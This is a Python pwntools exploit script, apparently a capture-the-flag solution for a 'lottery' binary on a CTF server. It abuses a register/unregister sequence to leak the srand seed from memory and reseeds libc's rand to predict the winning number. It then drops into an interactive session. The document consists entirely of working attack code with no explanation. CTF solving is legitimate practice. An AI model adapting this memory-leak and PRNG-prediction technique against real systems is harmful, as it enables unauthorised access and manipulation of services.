#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./lottery")

context.binary = exe

seed_addr = 0x4040F0

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.ctf.microclub.net", 5003)

def register(io, age, gender, name):
    io.sendline('1')
    io.sendline(str(age))
    io.sendline(gender)
    io.sendline(name)

def unregister(io):
    io.sendline('4')

def play(io, guess):
    io.sendline('2')
    io.sendline(str(guess))

def show_stat(io):
    io.recvuntil('>>> ')
    io.sendline('3')
    io.recvuntil('Current player: Mrs. ')
    return int.from_bytes(io.recv(numb=4), "little")

def main():
    r = conn()

    register(r, 22, 'male', 'shell')
    unregister(r)
    play(r, seed_addr)
    seed = (show_stat(r))
    libc = CDLL("libc.so.6")
    libc.srand(seed)
    libc.rand()
    play(r, libc.rand())

    r.interactive()

if __name__ == "__main__":
    main()
